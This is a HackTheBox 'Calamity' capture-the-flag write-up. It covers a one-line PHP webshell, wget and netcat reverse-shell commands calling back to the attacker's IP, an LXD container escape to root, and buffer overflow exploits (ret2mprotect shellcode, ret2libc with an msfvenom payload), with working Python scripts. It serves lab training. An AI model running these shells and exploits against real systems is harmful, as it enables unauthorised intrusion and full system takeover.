---
title: "HackTheBox - WriteUp 7"
date: 2019-06-09T19:46:08+08:00
description: "HackTheBox 练手"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Calamity

It just seems in Medium difficulty, however, it is really brainfuck in privilege escalation part.

## Before start

Nmap Scan: 80 and 22, Apache + SSH.

Gobuster Scan: /uploads(200), admin.php(200)

# Normal User

## Reverse shell

Access `admin.php` and you will find the `admin` with password in the comment of the webpage source code, which is: `password is:skoupidotenekes`

![lgnpage](https://alicdn.kmahyyg.xyz/asset_files/htb7/calamati-1.webp)

After you login, you've been told that this page could execute and php code. The question is that this method is submitted via URL params, so you can't submit too long code.

The shortest php webshell is: 

```php
<?=`$_GET[1]`?>
```

Just fired up my AntSword, generate a shell, and then detect if there's `wget`. It works. So write a php command to let it download the shell from the http server, 
Note: The `/var/www/html` is RO-only, you can only upload to `uploads/`

```php
<?php system("wget http://10.10.16.37:8080/te26st.php -o uploads/te26st.php");?>
```

After that, try `nc` to get a reverse shell. But after connection established, it get killed immediately. So what should we do? Check the `/etc/passwd` and found a normal user called `xalvas`, try to access to the home, succeeded. Then we got `user.txt`. However, there's a `intrusions` folder here. Check the content, just logged that there's a crappy IPS which blacklisted some process to run.

So let's just copy a `nc` to `/dev/shm` to avoid being killed:

```bash
$ cp /bin/nc /dev/shm/gibs
$ chmod 755 /dev/shm/gibs
```

Then grab a php reverse shell from pentestmonkey, run it with our "customized" nc.

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/gibs 10.10.16.37 12334 >/tmp/f");?>
```

Successfully got the shell we need.

## Interactive shell

Download the `recov.wav` and `alarmclocks/rick.wav`. Import both of them into `audacity`, and invert one of them. You will hear the normal user password. Don't forget to set repeatedly play the audio.

The password is: `18547936..*`

Just access it via SSH.

# Privilege Escalation

Of course, LinEnum first. 

Due to the normal user belongs to group lxd, and also the lxc is initialized before. 

And there's an ELF with `setuid` permission in `~/app`.

So we have two methods to escalate.

## LXC method

This is the easier one.

We notice xalvas is member of the lxd group. Like with most container technologies (e.g.,), you can run processes with root privileges via LXD. Thus, being member of groups like lxd are more or less equivalent to being root. [Here](https://reboare.github.io/lxd/lxd-escape.html) is a blog post with some details on how to exploit this group membership.

The privesc requires to run a container with elevated privileges and mount the host filesystem inside. Running containers requires an image on the machine. Since we do not have an internet connection on the machine, we have to copy over an image. The outline is as follows:

= Build an image locally and copy image to remote host
= Import image into LXD, create a container and mount host filesystem
= Run a shell inside the container and get flag

### Prepare image

Alpine is a popular Linux distribution to base container images on since it is so small. Unlike other operating systems, which may result in a few hundred megs, Alpine images are often rather small. In this [repository](https://github.com/saghul/lxd-alpine-builder) you can find a simple script to build a container. Clone it, cd into it, then run `./build-alpine -a i686` and a tar file `alpine-v3.7-i686-20180121_1729.tar.gz` will appear.

With SSH access, copying is as easy as running `scp alpine-v3.7-i686-20180121_1729.tar.gz xalvas@10.10.10.27:/dev/shm/.tmp/alpine.tar.gz` .

### Prepare container
Importing tar files as images is explained [here](https://stgraber.org/2016/03/30/lxd-2-0-image-management-512/). The steps are as follows:

```bash
xalvas@calamity:/dev/shm/.tmp$ lxc image import ./alpine.tar.gz --alias myimage
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: facaf59235080f8c950f700f1c0a9e65a7487901dfc30d04bd78bba7444df4b0
xalvas@calamity:/dev/shm/.tmp$ lxc image list
+---------+--------------+--------+------------------------------+------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |         DESCRIPTION          | ARCH |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+------------------------------+------+--------+------------------------------+
| myimage | facaf5923508 | no     | alpine v3.7 (20180121_17:29) | i686 | 2.37MB | Jan 21, 2018 at 8:06pm (UTC) |
+---------+--------------+--------+------------------------------+------+--------+------------------------------+
```

The output above asks us to run lxd init but if we try, it tells us we should sudo, which we can’t do. Fortunately, it will work without, so it’s ok to ignore.

We proceed by creating the container. The important part about it is using the flag security.privileged=true, which causes the container to interact as root with the host filesystem. This means all we have to do it mount the whole filesystem into the container and we get access to everything.

```bash
xalvas@calamity:/dev/shm/.tmp$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
xalvas@calamity:/dev/shm/.tml$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
xalvas@calamity:/dev/shm/.tmp$ lxc list
+-------------+---------+------+------+------------+-----------+
|    NAME     |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+-------------+---------+------+------+------------+-----------+
| mycontainer | STOPPED |      |      | PERSISTENT | 0         |
+-------------+---------+------+------+------------+-----------+
```

### Run shell

The last part is starting the container and executing a shell inside. We can then change into the rooted host filesystem and cat out the flag.

```bash
xalvas@calamity:/dev/shm/.tmp$ lxc start mycontainer
xalvas@calamity:/dev/shm/.tmp$ lxc exec mycontainer /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # ls -la /mnt/root/
total 108
drwxr-xr-x   22 root     root          4096 Jun 29  2017 .
drwxr-xr-x    3 root     root          4096 Jan 23 20:20 ..
drwxr-xr-x    2 root     root          4096 Jun 28  2017 bin
drwxr-xr-x    3 root     root          4096 Jun 27  2017 boot
drwxr-xr-x   18 root     root          3880 Jan 21 22:26 dev
drwxr-xr-x   96 root     root          4096 Jun 28  2017 etc
[...]
~ # cat /mnt/root/root/root.txt
9be6... <- flag
```

## Buffer Overflow 

**This is really the most difficult one I faced here.**

If you aren't a container expert, chances are you would have taken another much harder path. A simple search for SUID binaries delivers the following result:

```bash
xalvas@calamity:~$ find / -perm -4000 2>/dev/null
/home/xalvas/app/goodluck
/bin/ping6
/bin/umount
/bin/mount
[...]
```

A file called goodluck sounds like you are supposed to exploit it. And indeed, it is possible. Also the partial source code is in the folder.

### Before we start

I suggest you read the following contents as preparation:

- https://manybutfinite.com/post/journey-to-the-stack/
- http://man7.org/linux/man-pages/man2/mprotect.2.html
- https://www.roguesecurity.in/2017/07/16/a-quick-reference-guide-to-gnu-debugger/
- https://reboare.github.io/bof/linux-stack-bof-3.html
- https://drive.google.com/open?id=1QvbK-DABY8VCIu7qFzydcbXWs7EWShg6   (pop-pop-ret)

This man's blog is really useful:

- https://reboare.github.io

Check the Kernel ASLR: run `aslr` in `gdb-peda`, return `OFF`

Check the binary: run `checksec` in `gdb-peda`, return

> CANARY    : disabled
> FORTIFY   : disabled
> NX        : ENABLED
> PIE       : ENABLED
> RELRO     : Partial

![checksec](https://alicdn.kmahyyg.xyz/asset_files/htb7/calamati-2.webp)

### Start

The partial source code attached with the program can be found [here](https://pastebin.com/p15dyBXk).

Skim the code, to login as admin, you must let `hey.admin != 0` and `hey.secret == protect`. `protect` is a linux timeval in `usec` form and then XORed with `0x01010101`.

## Cross barrier 1: misc checks

If not specified, the commands listed below are `gdb-peda` commands.

> set disassembly-flavor intel
> p &hey

The hey is located at 0x80003068.

Let's quickly analyze `createusername`. According to the src, `ISIZE=4, USIZE=12`, this function simply read from a file and copy the content to `for_user[ISIZE]`, but the `copy` will copy the stdin for USIZE bytes, which allows us to overflow 8 bytes maximum. However, 8 Bytes are not enough to save the shellcode and also cannot guarantee we'll hit EIP.

### Test 1

Input with 'AAAA' from file, choose 3, "Access denied." (hey.admin == 0)

Input with 'AAAABBBB' from file, choose 3, "hackerrrrr." (hey.secret != protect)

Input with 'AAAABBBBCCCC' from file, choose 3, SEGV.

From the second return, the two params are meant to be equal, it's clear that we have tripped over this somehow.

Let's run gdb with the 3rd input, to analyze.

> disas createusername

Ok, let's break before and after `strncpy`.

> b *createusername+99
> b *craateusername+122
> r

As we seen in the photo, that's how we control the EBX,EAX,ECX,EDX.

![bp1](https://alicdn.kmahyyg.xyz/asset_files/htb7/calamati-3.webp)

![bp2](https://alicdn.kmahyyg.xyz/asset_files/htb7/calamati-4.webp)

So what's happening? 

> info frame

![infoframe](https://alicdn.kmahyyg.xyz/asset_files/htb7/calamati-5.webp)

returns all registers that are saved in the stack frame during the function.

The top one is the register we overwriting, ebx. Because this binary is compiled as a position independent executable (PIE), it has to have some way of referencing global variables and functions because memory addresses will be randomised if ASLR is enabled. This is where ebx comes in, as it points to the top of the Global Overwrite Table (GOT). The GOT can be referred to at runtime to find global variable and function addresses, which would only be determined once the program is started.

So ebx must be how the program refers to the struct `hey`. Effectively, any time a program accesses a member the hey struct, we can control the address it uses as we control ebx.

### Override Admin Check

> disas main

Now, we know we have 4 registers in control. Disassemly main function, at +262, + 263, +266, +267, before `attempt_login`, we see a instruction structure called `pop pop ret`. During a function call, a function will take as it’s arguments the top three values on the stack. Since attempt_login is called in the manner `attempt_login(hey.admin, protect, hey.secret);` we can ascertain that eax will contain the value of `hey.admin` at the time of the function call.

![regs1](https://alicdn.kmahyyg.xyz/asset_files/htb7/calamati-6.webp)

So that, the corresponding relationship is:

- hey.secret = edx
- protect = [ebp-0x14]
- hey.admin = eax

Check how each one is set:

(1) eax - Bypass `admin==0` Check

Firstly, the `lea eax, [ebx+0x68]` (NOTE: HERE IS **EBX** INSIDE BRACKET) instruction. This instruction performs arithmetic by evaluating the expression contained within the square brackets. Normally these square brackets mean, ‘fetch the memory at the address contained within the square brackets’, but here it just performs an expression then moves the result of that expression into eax. This is the key difference between the lea and move instructions.

Next, `mov eax, DWORD PTR [eax+0x10]` again performs arithmetic on the value contained within the square brackets, but this time, it fetches the value at address `eax+0x10` and places it within the eax register. This register doesn’t change until function call time so the value of hey.admin will be the value at address `[ebx+0x68+0x10]`.

To fix this problem, we just need to write a value into `ebx` that will end up with `[ebx+0x68+0x10]` pointing to a section of RAM that isn't 0.

The ebx here located at memory `0x80002ff0`, use `p/x 0x80003068-0x68-0x10` to get the value stored in it.

To check contents in the memory, use `x/x 0x80002ff0+0x68+0x10` to get the content.

Since `protect` is a local variable to `main` it’s read off the stack. This is evident as the value at `ebp-0x14` is pushed on the stack for the value protect. However, the `hey.secret` variable is passed in through `edx`, which uses `ebx` as a reference point to the GOT. Since we adjusted it for `hey.admin`, we’re inevitably going to affect any other reads to the `hey` struct. The only way to bypass this check is to build a `ebx` to a position that simultaneously reads the correct value for `hey.secret` and a non-zero value `hey.admin`.

So the file content input into the `createusername`:  `b"AAAABBBB" + struct.pack("<L", 0x80002ff0)` .

(2) edx - Read `hey.secret`

We cannot modify `hey` more than we already had done. So, the next step is read `hey.secret` and write it to a location in memory where we can point ebx.

> disas main

Again, on `main+224`, we see `push eax`, which should be `hey.session` in `printdeb(hey.session);`. This `eax` is set in the same way we analyzed above, which was set to `[ebx+0x68+0x14]` (NOTE: **0x14** here! **NOT** `0x10`!).

As we know, `hey` is storaged into `0x80003068`, Check the RAMMAP:

> x/4w &hey
>> 0x80003068 <hey>:       0x41414141      0x00000042      0x00000000      0x0107b34b

The `secret` variable, according to source code:

```c
#define USIZE 12
#define ISIZE 4

struct f {
    char user[USIZE];
    //int user;
    int secret;
    int admin;
    int session;
}hey;
```

So the `hey.secret` is on `0x80003068+12 = 0x80003074`.

That's it.

![heysucked](https://alicdn.kmahyyg.xyz/asset_files/htb7/calamati-7.webp)

In order to patch `eax` entering printdeb, we have to make sure it matches the following equation:

- 0x80003074 = ebx + 0x68 + 0x14  (Use `printdeb()` to see the secret)

So, the ebx is 0x80002ff8.

The file content input to `createusername()` is: `b"AAAABBBB" + struct.pack("<L", 0x80002ff8)`

Now, we have the `hey.secret`.

That's all we need.

### Check attempt_login()

Review:

- hey.secret = edx
- protect = [ebp-0x14]
- hey.admin = eax

According to the disassembly:

> disas attempt_login

The first part of `hey` can be anything we want. But we need to modify the edx to call back into `hey.user` instead of `hey.session`.

So that:

- eax = ebx + 0x68
- edx = [eax+0xc]

![allcalcregs](https://alicdn.kmahyyg.xyz/asset_files/htb7/calamati-8.webp)

The ebx should be `0x80002ff4`.

### Final script to build payload 1,2

```python
#!/usr/bin/env python3

import struct
import sys

args = len(sys.argv)
print(args)
with open('patchfile', 'wb') as tfile:
    if args == 1:
        tfile.write(b'ABCDEFGH')
        tfile.write(b'\xf8\x2f\x00\x80') #0x80002ff8
    if args == 2:
        tfile.write(struct.pack("<I", int(sys.argv[1], 16)))
        tfile.write(b'BBBB')
        tfile.write(struct.pack("<I", 0x80002FF4))
```

## SORT ALL THINGS OUT ABOVE!

1. 由于启用了 NX，所以 PIE 生效后 GOT 表必须有一个寄存器指向，以便间接访问。
2. 由于我们有源代码，所以可以知道全局变量表里的 hey 这个对应的 struct 的内存结构
3. 根据对 main 函数和 attempt_login 函数的反汇编，我们可以根据栈的 FILO 特性知道对应参数使用了哪些寄存器。
4. 对应各类寄存器，继续向上查找寄存器设定代码，获得寄存器之间的设定关系。根据缓冲区溢出的结果，确定字符串长度与对应寄存器的控制关系。
5. 利用程序可以动态加载用户文件的特性，构造对应 payload, 修改 BX 寄存器，达到读写特定变量的目的
6. 整体流程：构造 Payload -> 读取 Secret -> 将 Secret 输入到 hey.user -> 构造 Payload -> 验证通过，显示 RAMMAP -> 利用 mprotect 使栈内的代码可执行 -> shellcode 入栈 -> 提权完成。

## Ret2mprotect

Run the code we offered above, and after you see the RAMMAP. You were asked to offer another file here. Let's create a pattern in 100 chars with `pattern create 100 test100`, then offer it to the program, finally `pattern search` to get the data address in stack which overrided EIP, Here, it's 0xbffff5b0.

![rammap](https://alicdn.kmahyyg.xyz/asset_files/htb7/calamati-9.webp)
![offsetcheck](https://alicdn.kmahyyg.xyz/asset_files/htb7/calamati-10.webp)

According to the `disas main` and the man page of `mprotect`.

> int mprotect(void *addr, size_t len, int prot);

The `addr` is the starting address we need to set to RWX. set RWX ends at `addr+len`, `prot` is the UNIX Permission.

Address must be in stack, which is `bfedf000`, the length should be `0xc0000000 - 0xbfedf000 = 0x121000`, the `prot` is `0x7`.

Get the function address of `mprotect`, 

> p mprotect
>>  $1 = {<text variable, no debug info>} 0xb7efcd50 <mprotect>

Let's grab a shellcode from [here](https://www.soldierx.com/bbs/201308/HOWTO-x86-setresuid-execve-shellcode-44-bytes)

So, the whole process of this is: glibc_mprotect->buffer_with_shellcode->mprotect_params.

```python
#!/usr/bin/env python3
import struct

scode = b"\x90\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x89\xc2\x31\xc0\xb0\xa4\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

ret_address = 0xbffff5b0 # Replace vulnaddr here

mprotect = struct.pack("<L", 0xb7efcd50) # Replace with mprotect addr
stackadd = struct.pack("<L", 0xbfedf000) # Replace with stack addr in the mapping
stacksize = struct.pack("<L", 0x121000) 
setread = b'\x07\x00\x00\x00'


buf = b""
buf += scode.ljust(76, b"\x90") # ljust sets a fixed length buffer, regardless of payload length and writes our rop chain, the padding is \x90=nop
buf += mprotect
buf += struct.pack("<L", ret_address)
buf += stackadd
buf += stacksize
buf += setread

with open('tmpbuf','wb') as buffef:
	buffef.write(buf)
```

![rooted](https://alicdn.kmahyyg.xyz/asset_files/htb7/calamati-11.webp)

## Ret2libc

(1) libc_execl->libc_exit->pointer_path_to_bin->NULL->NULL

Generate shellcode:

> msfvenom -p linux/x86/exec CMD=/bin/bash LHOST=10.10.15.174 LPORT=443 PrependSetuid=true -f elf -o booj.elf

Send it to the box:

> scp booj.elf xalvas@10.10.10.27:/tmp

Find the function we need:

> gdb-peda$ p execl
>> $1 = {<text variable, no debug info>} 0xb7ecaa80 <__GI_execl>
> gdb-peda$ p exit
>> $2 = {<text variable, no debug info>} 0xb7e489d0 <__GI_exit>

The `execl` function usage:

```c
int execl(const char *path, const char *arg0,
     ...  /* const char *argn, NULL */);
```

Since it requested args, but we don't need them, just pass NULL into it.

But it may leads to problem, however, it use `copy()` with `fread()`, so it's not going to be a problem here.


In this way, the exploit should be like this:

```python
#!/usr/bin/env python3
import struct

ret_address = struct.pack('<I',0xbffff540) # replace this with vulnaddr

tmpbooj = b"/tmp/booj.elf\x00\x00\x00"
execl = struct.pack("<L", 0xb7ecaa80)
exit = struct.pack("<L", 0xb7e489d0)

buf = b""
buf += tmpbooj.ljust(76, b'\x90')
buf += execl
buf += exit
buf += ret_address
buf += struct.pack("<L", 0x0)
buf += struct.pack("<L", 0x0)

with open('tmpbuf','wb') as buffef:
	buffef.write(buf)
```

(2) Why not `system()` ?

`system` can be broken down into three function calls `fork`, `exec` and `wait`. So the entire process memory is forked and the given file is then run. The issue with [this](https://stackoverflow.com/questions/32892908/c-system-raises-enomem?noredirect=1&lq=1) is we’re liable to run out of virtual memory if we use this. Give it a try if you want and you’ll see that the exploitation fails. If you do manage to get it working, let me know.

(END) 2019.6.10
